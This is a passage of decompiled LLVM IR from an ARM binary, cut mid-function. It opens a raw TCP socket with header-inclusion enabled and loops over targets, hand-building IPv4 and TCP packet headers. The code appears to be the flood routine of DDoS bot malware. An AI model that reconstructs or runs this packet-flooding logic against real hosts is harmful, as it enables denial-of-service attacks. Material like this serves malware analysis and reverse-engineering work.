  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b674 = load i32, i32* @r4, align 4
  store i32 %v0_b674, i32* %r0.global-to-local, align 4
  %v5_b678 = trunc i32 %v5_b65c to i8
  %v6_b67c = inttoptr i32 %v0_b668 to i32*
  %v7_b67c = call i32 @function_b240(i32 %v0_b674, i32* %v6_b67c, i32 5, i32 1)
  %v1_b688 = urem i32 %v7_b67c, 256
  store i32 %v1_b688, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b694 = load i32, i32* @r5, align 4
  store i32 %v0_b694, i32* %r1.global-to-local, align 4
  %v0_b698 = load i32, i32* @r4, align 4
  store i32 %v0_b698, i32* %r0.global-to-local, align 4
  %v5_b6a0 = inttoptr i32 %v0_b694 to i32*
  %v6_b6a0 = call i32 @function_b240(i32 %v0_b698, i32* %v5_b6a0, i32 6, i32 65535)
  %v0_b6a8 = load i32, i32* @r5, align 4
  store i32 %v0_b6a8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b6a0, i32* @sl, align 4
  %v0_b6b8 = load i32, i32* @r4, align 4
  store i32 %v0_b6b8, i32* %r0.global-to-local, align 4
  %v4_b6bc = inttoptr i32 %v0_b6a8 to i32*
  %v5_b6bc = call i32 @function_b240(i32 %v0_b6b8, i32* %v4_b6bc, i32 7, i32 65535)
  %v0_b6c0 = load i32, i32* @r5, align 4
  store i32 %v0_b6c0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_b6bc, i32* @r8, align 4
  %v0_b6d0 = load i32, i32* @r4, align 4
  store i32 %v0_b6d0, i32* %r0.global-to-local, align 4
  %v4_b6d4 = inttoptr i32 %v0_b6c0 to i32*
  %v5_b6d4 = call i32 @function_b240(i32 %v0_b6d0, i32* %v4_b6d4, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b6e4 = load i32, i32* @r5, align 4
  store i32 %v0_b6e4, i32* %r1.global-to-local, align 4
  %v0_b6e8 = load i32, i32* @r4, align 4
  store i32 %v0_b6e8, i32* %r0.global-to-local, align 4
  %v4_b6ec = inttoptr i32 %v0_b6e4 to i32*
  %v5_b6ec = call i32 @function_b240(i32 %v0_b6e8, i32* %v4_b6ec, i32 1, i32 1)
  %v1_b6f4 = urem i32 %v5_b6ec, 256
  store i32 %v1_b6f4, i32* %ip.global-to-local, align 4
  %v0_b6f8 = load i32, i32* @r5, align 4
  store i32 %v0_b6f8, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b704 = load i32, i32* @r4, align 4
  store i32 %v0_b704, i32* %r0.global-to-local, align 4
  %v5_b70c = inttoptr i32 %v0_b6f8 to i32*
  %v6_b70c = call i32 @function_b240(i32 %v0_b704, i32* %v5_b70c, i32 19, i32 0)
  %v0_b714 = load i32, i32* @r5, align 4
  store i32 %v0_b714, i32* %r1.global-to-local, align 4
  %v2_b718 = load i32, i32* @global_var_1cd48.140, align 4
  store i32 %v2_b718, i32* %r3.global-to-local, align 4
  store i32 %v6_b70c, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b724 = load i32, i32* @r4, align 4
  store i32 %v0_b724, i32* %r0.global-to-local, align 4
  %v4_b728 = inttoptr i32 %v0_b714 to i32*
  %v5_b728 = call i32 @function_b240(i32 %v0_b724, i32* %v4_b728, i32 25, i32 %v2_b718)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b73c = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b73c, i32* %r0.global-to-local, align 4
  %v7_b740 = icmp eq i32 %v3_b73c, -1
  store i1 %v7_b740, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b740, label %dec_label_pc_bc24, label %dec_label_pc_b74c

dec_label_pc_b74c:                                ; preds = %dec_label_pc_b5e8
  store i32 1, i32* %stack_var_-40, align 4
  %v6_b754 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_b754, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_b768 = call i32 @setsockopt(i32 %v3_b73c, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_b768, i32* %r0.global-to-local, align 4
  %v7_b76c = icmp eq i32 %v7_b768, -1
  store i1 %v7_b76c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b76c, label %dec_label_pc_bc1c, label %dec_label_pc_b774

dec_label_pc_b774:                                ; preds = %dec_label_pc_b74c
  %v0_b774 = load i32, i32* @sl, align 4
  %v3_b774 = mul i32 %v0_b774, 65536
  store i32 %v3_b774, i32* %sl.global-to-local, align 4
  %v0_b778 = load i32, i32* @r8, align 4
  %v3_b778 = mul i32 %v0_b778, 65536
  store i32 %v3_b778, i32* %r8.global-to-local, align 4
  %v0_b780 = load i32, i32* @r7, align 4
  %v3_b780 = mul i32 %v0_b780, 65536
  store i32 %v3_b780, i32* %r7.global-to-local, align 4
  %v0_b784 = load i32, i32* @r6, align 4
  %v1_b784 = urem i32 %v0_b784, 256
  store i32 %v1_b784, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v3_b78c = urem i32 %v0_b780, 65536
  store i32 %v3_b78c, i32* %r2.global-to-local, align 4
  %v3_b790 = urem i32 %v0_b774, 65536
  store i32 %v3_b790, i32* %r3.global-to-local, align 4
  %v3_b794 = urem i32 %v0_b778, 65536
  store i32 %v3_b794, i32* %r1.global-to-local, align 4
  %v0_b798 = load i32, i32* @fp, align 4
  %v2_b798 = icmp eq i32 %v0_b798, 0
  store i1 %v2_b798, i1* %cpsr_z.global-to-local, align 1
  %tmp89 = icmp slt i32 %v0_b798, 1
  br i1 %tmp89, label %dec_label_pc_bd44, label %dec_label_pc_b7b8

dec_label_pc_b7b8:                                ; preds = %dec_label_pc_b774
  %v3_b7bc = mul i32 %v5_b6d4, 65536
  %v0_b780.not = or i32 %v0_b780, -65536
  %v1_b7c4 = xor i32 %v0_b780.not, 65535
  %v1_b7cc = add i32 %v3_b7bc, 4325376
  %v1_b7d0 = urem i32 %v0_b774, 256
  %v3_b7d8 = udiv i32 %v1_b7cc, 256
  %v1_b7dc = add i32 %v3_b7bc, 524288
  %v1_b7e4 = add i32 %v3_b7bc, 1835008
  %v1_b7e8 = urem i32 %v0_b778, 256
  %v1_b7ec = and i32 %v3_b7d8, 65280
  store i32 %v1_b7ec, i32* %r0.global-to-local, align 4
  %v3_b7f4 = udiv i32 %v1_b7e4, 256
  %tmp90 = mul nsw i32 %v1_b7c4, 256
  %v1_b80c = and i32 %v3_b7f4, 65280
  store i32 %v1_b80c, i32* %ip.global-to-local, align 4
  %v1_b810 = and i32 %tmp90, 65280
  store i32 %v1_b810, i32* %lr.global-to-local, align 4
  %tmp92 = udiv i32 %v1_b7c4, 256
  %v4_b7fc = sdiv i32 %v1_b7cc, 16777216
  %v5_b82c = trunc i32 %tmp92 to i8
  %v3_b838 = mul nuw nsw i32 %v1_b7d0, 256
  %v3_b840 = ashr i32 %v1_b7cc, 31
  %v3_b844 = mul nuw nsw i32 %v1_b7e8, 256
  store i32 %v3_b844, i32* %r5.global-to-local, align 4
  %tmp93 = udiv i32 %v0_b774, 256
  %v4_b848 = urem i32 %tmp93, 256
  %v5_b848 = or i32 %v4_b848, %v3_b838
  store i32 %v5_b848, i32* %r7.global-to-local, align 4
  %v3_b84c = udiv i32 %v1_b7dc, 256
  %tmp94 = udiv i32 %v0_b778, 256
  %v4_b850 = urem i32 %tmp94, 256
  %v5_b850 = or i32 %v4_b850, %v3_b844
  store i32 %v5_b850, i32* %sl.global-to-local, align 4
  %v5_b854 = trunc i32 %v3_b840 to i8
  %v3_b85c = sdiv i32 %v3_b780, 16777216
  %v7_b85c = sdiv i32 %v1_b7e4, 16777216
  %v1_b860 = and i32 %v3_b84c, 65280
  store i32 %v1_b860, i32* %r6.global-to-local, align 4
  %v3_b864 = ashr i32 %v3_b780, 31
  %v3_b868 = ashr i32 %v1_b7e4, 31
  %v3_b86c = udiv i32 %v1_b7c4, 65536
  %v4_b870 = udiv i32 %v1_b7dc, 16777216
  %v5_b870 = or i32 %v4_b870, %v1_b860
  store i32 %v5_b870, i32* %r8.global-to-local, align 4
  store i32 %v1_b7d0, i32* %r1.global-to-local, align 4
  store i32 %v1_b7e8, i32* %r2.global-to-local, align 4
  %v3_b88838 = udiv i32 %v1_b860, 256
  store i32 %v3_b88838, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v4_b8e8 = sext i8 %v5_b678 to i32
  %v2_b9e8 = icmp eq i32 %v1_b784, 0
  %sext17 = mul i32 %v0_b774, 16777216
  %v4_b9fc = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v1_b7dc, 256
  %v4_ba10 = sdiv i32 %sext18, 16777216
  %sext19 = mul i32 %v0_b778, 16777216
  %v4_ba18 = sdiv i32 %sext19, 16777216
  %v1_ba20 = trunc i32 %v4_ba10 to i8
  br label %dec_label_pc_b89c

dec_label_pc_b89c:                                ; preds = %bb106, %dec_label_pc_b7b8
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_b8a8 = call i32* @calloc(i32 1510, i32 4)
  %v4_b8a8 = ptrtoint i32* %v2_b8a8 to i32
  store i32 %v4_b8a8, i32* %r0.global-to-local, align 4
  store i32 %v4_b608, i32* %r1.global-to-local, align 4
  %v3_b8b0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b8b0, i32* %r3.global-to-local, align 4
  %v2_b8b4 = load i32, i32* %r4.global-to-local, align 4
  %v5_b8b4 = mul i32 %v2_b8b4, 4
  %v6_b8b4 = add i32 %v5_b8b4, %v4_b608
  %v7_b8b4 = inttoptr i32 %v6_b8b4 to i32*
  store i32 %v4_b8a8, i32* %v7_b8b4, align 4
  %v0_b8b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b8b8 = load i32, i32* %r3.global-to-local, align 4
  %v4_b8b8 = mul i32 %v1_b8b8, 4
  %v5_b8b8 = add i32 %v4_b8b8, %v0_b8b8
  %v6_b8b8 = inttoptr i32 %v5_b8b8 to i32*
  %v7_b8b8 = load i32, i32* %v6_b8b8, align 4
  store i32 %v7_b8b8, i32* %r4.global-to-local, align 4
  %v1_b8bc = inttoptr i32 %v7_b8b8 to i8*
  %v2_b8bc = load i8, i8* %v1_b8bc, align 1
  %tmp = urem i8 %v2_b8bc, 16
  %v1_b8c0 = zext i8 %tmp to i32
  %v1_b8c4 = or i32 %v1_b8c0, 64
  store i32 %v1_b8c4, i32* %r2.global-to-local, align 4
  %v1_b8c8 = trunc i32 %v1_b8c4 to i8
  store i8 %v1_b8c8, i8* %v1_b8bc, align 1
  %v0_b8cc = load i32, i32* %r4.global-to-local, align 4
  %v1_b8cc = inttoptr i32 %v0_b8cc to i8*
  %v2_b8cc = load i8, i8* %v1_b8cc, align 1
  %v1_b8d0 = and i8 %v2_b8cc, -16
  %v1_b8d4 = or i8 %v1_b8d0, 5
  store i32 %v1_b688, i32* %r2.global-to-local, align 4
  store i8 %v1_b8d4, i8* %v1_b8cc, align 1
  %v2_b8e4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b8e4 = add i32 %v2_b8e4, 1
  %v4_b8e4 = inttoptr i32 %v3_b8e4 to i8*
  store i8 %v5_b640, i8* %v4_b8e4, align 1
  store i32 %v4_b8e8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_b8f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b8f0 = add i32 %v2_b8f0, 8
  %v4_b8f0 = inttoptr i32 %v3_b8f0 to i8*
  store i8 %v5_b678, i8* %v4_b8f0, align 1
  %v0_b8f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b8f4 = load i32, i32* %ip.global-to-local, align 4
  %v9_b8f4 = icmp eq i32 %v0_b8f4, %v1_b8f4
  store i1 %v9_b8f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b840, i32* %r3.global-to-local, align 4
  store i32 %v4_b7fc, i32* %r2.global-to-local, align 4
  %v2_b900 = load i32, i32* %r4.global-to-local, align 4
  %v3_b900 = add i32 %v2_b900, 3
  %v4_b900 = inttoptr i32 %v3_b900 to i8*
  store i8 %v5_b854, i8* %v4_b900, align 1
  %v0_b904 = load i32, i32* %r2.global-to-local, align 4
  %v1_b904 = trunc i32 %v0_b904 to i8
  %v2_b904 = load i32, i32* %r4.global-to-local, align 4
  %v3_b904 = add i32 %v2_b904, 2
  %v4_b904 = inttoptr i32 %v3_b904 to i8*
  store i8 %v1_b904, i8* %v4_b904, align 1
  %v0_b908 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b908, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_b89c
  store i32 %v3_b864, i32* %r2.global-to-local, align 4
  %extract.t115 = trunc i32 %v3_b864 to i8
  br label %bb95

bb:                                               ; preds = %dec_label_pc_b89c
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v3_b864, i32* %r2.global-to-local, align 4
  %v3_b910 = load i32, i32* %r4.global-to-local, align 4
  %v4_b910 = add i32 %v3_b910, 6
  %v5_b910 = inttoptr i32 %v4_b910 to i8*
  store i8 64, i8* %v5_b910, align 1
  %v0_b918.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t116 = trunc i32 %v0_b918.pre to i8
  br label %bb95

bb95:                                             ; preds = %.thread, %bb
  %v3_b864.sink.off0 = phi i8 [ %extract.t115, %.thread ], [ %extract.t116, %bb ]
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_b918 = load i32, i32* %r4.global-to-local, align 4
  %v3_b918 = add i32 %v2_b918, 5
  %v4_b918 = inttoptr i32 %v3_b918 to i8*
  store i8 %v3_b864.sink.off0, i8* %v4_b918, align 1
  store i32 %v3_b85c, i32* %r1.global-to-local, align 4
  %v0_b920 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b920, label %bb97, label %bb96

bb96:                                             ; preds = %bb95
  %v1_b920 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_b920, i32* %r2.global-to-local, align 4
  br label %bb97

bb97:                                             ; preds = %bb95, %bb96
  %v0_b924 = load i32, i32* %r3.global-to-local, align 4
  %v1_b924 = trunc i32 %v0_b924 to i8
  %v2_b924 = load i32, i32* %r4.global-to-local, align 4
  %v3_b924 = add i32 %v2_b924, 9
  %v4_b924 = inttoptr i32 %v3_b924 to i8*
  store i8 %v1_b924, i8* %v4_b924, align 1
  %v0_b928 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b928, label %bb99, label %bb98

bb98:                                             ; preds = %bb97
  %v1_b928 = load i32, i32* %r2.global-to-local, align 4
  %v2_b928 = trunc i32 %v1_b928 to i8
  %v3_b928 = load i32, i32* %r4.global-to-local, align 4
  %v4_b928 = add i32 %v3_b928, 7
  %v5_b928 = inttoptr i32 %v4_b928 to i8*
  store i8 %v2_b928, i8* %v5_b928, align 1
  br label %bb99

bb99:                                             ; preds = %bb97, %bb98
  %v3_b92c = load i32, i32* %stack_var_-40, align 4
  %v5_b934 = mul i32 %v3_b92c, 24
  store i32 %v5_b934, i32* %r3.global-to-local, align 4
  store i32 %v5_b728, i32* %r2.global-to-local, align 4
  %v1_b93c = load i32, i32* %r4.global-to-local, align 4
  %v2_b93c = add i32 %v1_b93c, 12
  %v3_b93c = inttoptr i32 %v2_b93c to i32*
  store i32 %v5_b728, i32* %v3_b93c, align 4
  %v0_b940 = load i32, i32* %r3.global-to-local, align 4
  %v1_b940 = load i32, i32* @sb, align 4
  %v2_b940 = add i32 %v1_b940, %v0_b940
  store i32 %v2_b940, i32* %r3.global-to-local, align 4
  %v1_b944 = add i32 %v2_b940, 16
  %v2_b944 = inttoptr i32 %v1_b944 to i32*
  %v3_b944 = load i32, i32* %v2_b944, align 4
  store i32 %v3_b944, i32* %r2.global-to-local, align 4
  %v0_b948 = load i32, i32* %r1.global-to-local, align 4
  %v1_b948 = trunc i32 %v0_b948 to i8
  %v2_b948 = load i32, i32* %r4.global-to-local, align 4
  %v3_b948 = add i32 %v2_b948, 4
  %v4_b948 = inttoptr i32 %v3_b948 to i8*
  store i8 %v1_b948, i8* %v4_b948, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v0_b950 = load i32, i32* %r4.global-to-local, align 4
  %v1_b950 = add i32 %v0_b950, 20
  store i32 %v1_b950, i32* %r1.global-to-local, align 4
  %v3_b954 = add i32 %v0_b950, 22
  %v4_b954 = inttoptr i32 %v3_b954 to i8*
  store i8 101, i8* %v4_b954, align 1
  %v0_b958 = load i32, i32* %r2.global-to-local, align 4
  %v1_b958 = load i32, i32* %r4.global-to-local, align 4
  %v2_b958 = add i32 %v1_b958, 16
  %v3_b958 = inttoptr i32 %v2_b958 to i32*
  store i32 %v0_b958, i32* %v3_b958, align 4
  %v0_b95c = load i32, i32* %r4.global-to-local, align 4
  %v1_b95c = add i32 %v0_b95c, 24
  store i32 %v1_b95c, i32* %r0.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v0_b964 = load i32, i32* %r3.global-to-local, align 4
  %v1_b964 = add i32 %v0_b964, -93
  store i32 %v1_b964, i32* %r3.global-to-local, align 4
  %v2_b968 = load i32, i32* %r1.global-to-local, align 4
  %v3_b968 = add i32 %v2_b968, 3
  %v4_b968 = inttoptr i32 %v3_b968 to i8*
  store i8 88, i8* %v4_b968, align 1
  %v0_b96c = load i32, i32* %r3.global-to-local, align 4
  %v1_b96c = trunc i32 %v0_b96c to i8
  %v2_b96c = load i32, i32* %r0.global-to-local, align 4
  %v3_b96c = add i32 %v2_b96c, 12
  %v4_b96c = inttoptr i32 %v3_b96c to i8*
  store i8 %v1_b96c, i8* %v4_b96c, align 1
  %v0_b970 = load i32, i32* %ip.global-to-local, align 4
  %v1_b970 = trunc i32 %v0_b970 to i8
  %v2_b970 = load i32, i32* %r0.global-to-local, align 4
  %v3_b970 = add i32 %v2_b970, 13
  %v4_b970 = inttoptr i32 %v3_b970 to i8*
  store i8 %v1_b970, i8* %v4_b970, align 1
  %v0_b974 = load i32, i32* %r4.global-to-local, align 4
  %v1_b974 = add i32 %v0_b974, 38
  %v2_b974 = inttoptr i32 %v1_b974 to i8*
  %v3_b974 = load i8, i8* %v2_b974, align 1
  %tmp117 = urem i8 %v3_b974, 16
  %v1_b978 = zext i8 %tmp117 to i32
  %v1_b97c = or i32 %v1_b978, 64
  store i32 %v1_b97c, i32* %r3.global-to-local, align 4
  %v1_b980 = trunc i32 %v1_b97c to i8
  store i8 %v1_b980, i8* %v2_b974, align 1
  %v0_b984 = load i32, i32* %r4.global-to-local, align 4
  %v1_b984 = add i32 %v0_b984, 38
  %v2_b984 = inttoptr i32 %v1_b984 to i8*
  %v3_b984 = load i8, i8* %v2_b984, align 1
  %v1_b988 = and i8 %v3_b984, -16
  %v1_b98c = or i8 %v1_b988, 5
  store i8 %v1_b98c, i8* %v2_b984, align 1
  %v0_b998 = load i32, i32* %r4.global-to-local, align 4
  %v1_b998 = add i32 %v0_b998, 38
  store i32 %v1_b998, i32* %r5.global-to-local, align 4
  %v3_b99c = add i32 %v0_b998, 39
  %v4_b99c = inttoptr i32 %v3_b99c to i8*
  store i8 %v5_b640, i8* %v4_b99c, align 1
  store i32 %v7_b85c, i32* %r1.global-to-local, align 4
  store i32 %tmp92, i32* %r3.global-to-local, align 4
  store i32 %v3_b868, i32* %r2.global-to-local, align 4
  %v2_b9ac = load i32, i32* %r5.global-to-local, align 4
  %v3_b9ac = add i32 %v2_b9ac, 4
  %v4_b9ac = inttoptr i32 %v3_b9ac to i8*
  store i8 %v5_b82c, i8* %v4_b9ac, align 1
  %v0_b9b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_b9b0 = trunc i32 %v0_b9b0 to i8
  %v2_b9b0 = load i32, i32* %r5.global-to-local, align 4
  %v3_b9b0 = add i32 %v2_b9b0, 2
  %v4_b9b0 = inttoptr i32 %v3_b9b0 to i8*
  store i8 %v1_b9b0, i8* %v4_b9b0, align 1
  %v0_b9b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b9b4, label %bb101, label %bb100

bb100:                                            ; preds = %bb99
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb101

bb101:                                            ; preds = %bb99, %bb100
  store i32 %v3_b86c, i32* %r1.global-to-local, align 4
  %v0_b9bc = load i32, i32* %r2.global-to-local, align 4
  %v1_b9bc = trunc i32 %v0_b9bc to i8
  %v2_b9bc = load i32, i32* %r5.global-to-local, align 4
  %v3_b9bc = add i32 %v2_b9bc, 3
  %v4_b9bc = inttoptr i32 %v3_b9bc to i8*
  store i8 %v1_b9bc, i8* %v4_b9bc, align 1
  store i32 %v4_b8e8, i32* %r2.global-to-local, align 4
  %v0_b9c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b9c4, label %bb103, label %bb102

bb102:                                            ; preds = %bb101
  %v1_b9c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_b9c4 = trunc i32 %v1_b9c4 to i8
  %v3_b9c4 = load i32, i32* %r5.global-to-local, align 4
  %v4_b9c4 = add i32 %v3_b9c4, 6
  %v5_b9c4 = inttoptr i32 %v4_b9c4 to i8*
  store i8 %v2_b9c4, i8* %v5_b9c4, align 1
  br label %bb103

bb103:                                            ; preds = %bb101, %bb102
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_b9cc = load i32, i32* %r1.global-to-local, align 4
  %v1_b9cc = trunc i32 %v0_b9cc to i8
  %v2_b9cc = load i32, i32* %r5.global-to-local, align 4
  %v3_b9cc = add i32 %v2_b9cc, 5
  %v4_b9cc = inttoptr i32 %v3_b9cc to i8*
  store i8 %v1_b9cc, i8* %v4_b9cc, align 1
  %v0_b9d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b9d0 = trunc i32 %v0_b9d0 to i8
  %v2_b9d0 = load i32, i32* %r5.global-to-local, align 4
  %v3_b9d0 = add i32 %v2_b9d0, 8
  %v4_b9d0 = inttoptr i32 %v3_b9d0 to i8*
  store i8 %v1_b9d0, i8* %v4_b9d0, align 1
  %v0_b9d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b9d4, label %bb105, label %bb104

bb104:                                            ; preds = %bb103
  %v1_b9d4 = load i32, i32* %ip.global-to-local, align 4
  %v2_b9d4 = trunc i32 %v1_b9d4 to i8
  %v3_b9d4 = load i32, i32* %r5.global-to-local, align 4
  %v4_b9d4 = add i32 %v3_b9d4, 7
  %v5_b9d4 = inttoptr i32 %v4_b9d4 to i8*
  store i8 %v2_b9d4, i8* %v5_b9d4, align 1
  br label %bb105

bb105:                                            ; preds = %bb103, %bb104
  %v0_b9d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b9d8 = trunc i32 %v0_b9d8 to i8
  %v2_b9d8 = load i32, i32* %r5.global-to-local, align 4
  %v3_b9d8 = add i32 %v2_b9d8, 9
  %v4_b9d8 = inttoptr i32 %v3_b9d8 to i8*
  store i8 %v1_b9d8, i8* %v4_b9d8, align 1
  %v0_b9dc = call i32 @function_10b68()
  store i32 %v0_b9dc, i32* %r0.global-to-local, align 4
  store i32 %v1_b784, i32* %r1.global-to-local, align 4
  store i1 %v2_b9e8, i1* %cpsr_z.global-to-local, align 1
  %v1_b9ec = sub i32 1023, %v0_b9dc
  store i32 %v1_b9ec, i32* %r3.global-to-local, align 4
  br i1 %v2_b9e8, label %.thread22, label %.thread23

.thread22:                                        ; preds = %bb105
  %v2_b9f4 = load i32, i32* %r5.global-to-local, align 4
  %v3_b9f4 = add i32 %v2_b9f4, 16
  %v4_b9f4 = inttoptr i32 %v3_b9f4 to i32*
  store i32 %v1_b9ec, i32* %v4_b9f4, align 4
  br label %bb106

.thread23:                                        ; preds = %bb105
  %v1_b9f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_b9f0 = add i32 %v1_b9f0, 16
  %v3_b9f0 = inttoptr i32 %v2_b9f0 to i32*
  %v4_b9f0 = load i32, i32* %v3_b9f0, align 4
  store i32 %v4_b9f0, i32* %r3.global-to-local, align 4
  %v2_b9f8 = load i32, i32* %r5.global-to-local, align 4
  %v3_b9f8 = add i32 %v2_b9f8, 16
  %v4_b9f8 = inttoptr i32 %v3_b9f8 to i32*
  store i32 %v4_b9f0, i32* %v4_b9f8, align 4
  br label %bb106

bb106:                                            ; preds = %.thread22, %.thread23
  store i32 %v4_b9fc, i32* %r3.global-to-local, align 4
  %v0_ba00 = load i32, i32* %r4.global-to-local, align 4
  %v1_ba00 = add i32 %v0_ba00, 58
  store i32 %v1_ba00, i32* %r6.global-to-local, align 4
  %v1_ba04 = load i32, i32* %r5.global-to-local, align 4
  %v2_ba04 = add i32 %v1_ba04, 12
  %v3_ba04 = inttoptr i32 %v2_ba04 to i32*
  store i32 %v0_b9dc, i32* %v3_ba04, align 4
  %v0_ba08 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba08 = trunc i32 %v0_ba08 to i8
  %v2_ba08 = load i32, i32* %r6.global-to-local, align 4
  %v3_ba08 = add i32 %v2_ba08, 1
  %v4_ba08 = inttoptr i32 %v3_ba08 to i8*
  store i8 %v1_ba08, i8* %v4_ba08, align 1
  %v3_ba0c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ba0c, i32* %r3.global-to-local, align 4
  store i32 %v4_ba10, i32* %r2.global-to-local, align 4
  %v1_ba14 = add i32 %v3_ba0c, 1
  store i32 %v1_ba14, i32* %r4.global-to-local, align 4
  store i32 %v4_ba18, i32* %r1.global-to-local, align 4
  %v1_ba1c = load i32, i32* @fp, align 4
  %v9_ba1c = icmp eq i32 %v1_ba14, %v1_ba1c
  store i1 %v9_ba1c, i1* %cpsr_z.global-to-local, align 1
  %v2_ba20 = load i32, i32* %r6.global-to-local, align 4
  %v3_ba20 = add i32 %v2_ba20, 5
  %v4_ba20 = inttoptr i32 %v3_ba20 to i8*
  store i8 %v1_ba20, i8* %v4_ba20, align 1
  %v0_ba24 = load i32, i32* %r7.global-to-local, align 4
  %v1_ba24 = trunc i32 %v0_ba24 to i8
  %v2_ba24 = load i32, i32* %r6.global-to-local, align 4
  %v3_ba24 = inttoptr i32 %v2_ba24 to i8*
  store i8 %v1_ba24, i8* %v3_ba24, align 1
  %v0_ba28 = load i32, i32* %sl.global-to-local, align 4
  %v1_ba28 = trunc i32 %v0_ba28 to i8
  %v2_ba28 = load i32, i32* %r6.global-to-local, align 4
  %v3_ba28 = add i32 %v2_ba28, 2
  %v4_ba28 = inttoptr i32 %v3_ba28 to i8*
  store i8 %v1_ba28, i8* %v4_ba28, align 1
  %v0_ba2c = load i32, i32* %r1.global-to-local, align 4
  %v1_ba2c = trunc i32 %v0_ba2c to i8
  %v2_ba2c = load i32, i32* %r6.global-to-local, align 4
  %v3_ba2c = add i32 %v2_ba2c, 3
  %v4_ba2c = inttoptr i32 %v3_ba2c to i8*
  store i8 %v1_ba2c, i8* %v4_ba2c, align 1
  %v0_ba30 = load i32, i32* %r8.global-to-local, align 4
  %v1_ba30 = trunc i32 %v0_ba30 to i8
  %v2_ba30 = load i32, i32* %r6.global-to-local, align 4
  %v3_ba30 = add i32 %v2_ba30, 4
  %v4_ba30 = inttoptr i32 %v3_ba30 to i8*
  store i8 %v1_ba30, i8* %v4_ba30, align 1
  %v0_ba34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ba34, i32* %stack_var_-40, align 4
  %v5_ba38 = icmp slt i32 %v1_ba14, %v1_ba1c
  br i1 %v5_ba38, label %dec_label_pc_b89c, label %dec_label_pc_ba3c

dec_label_pc_ba3c:                                ; preds = %bb106
  %v1_ba44 = add i32 %v5_b6d4, 8
  store i32 %v1_ba44, i32* %r2.global-to-local, align 4
  %v1_ba48 = add i32 %v5_b6d4, 66
  store i32 %v1_ba48, i32* %r3.global-to-local, align 4
  %v0_ba54.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_ba54.preheader

dec_label_pc_ba54.preheader:                      ; preds = %dec_label_pc_ba3c, %dec_label_pc_bd44
  %v0_ba54.pre = phi i32 [ %v0_ba54.pre.pre, %dec_label_pc_ba3c ], [ %v0_b798, %dec_label_pc_bd44 ]
  %stack_var_-160.0.ph = phi i32 [ %v1_ba48, %dec_label_pc_ba3c ], [ %v1_bd50, %dec_label_pc_bd44 ]
  %stack_var_-156.0.ph = phi i32 [ %v1_ba44, %dec_label_pc_ba3c ], [ %v1_bd4c, %dec_label_pc_bd44 ]
  %v3_bca4 = icmp eq i32 %v3_b78c, 65535
  %v2_bd14 = icmp eq i32 %v1_b784, 0
  %v2_baf8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_bb10 = ptrtoint i32* %stack_var_-48 to i32
  %v2_bb20 = ptrtoint i32* %stack_var_-52 to i32
  %v2_bb2c = ptrtoint i32* %stack_var_-50 to i32
  %v2_bb40 = icmp eq i32 %v1_b6f4, 0
  %v2_ba9c = icmp eq i32 %v5_b728, -1
  %v7_ba9c = icmp eq i32 %v5_b728, -1
  br label %dec_label_pc_ba54

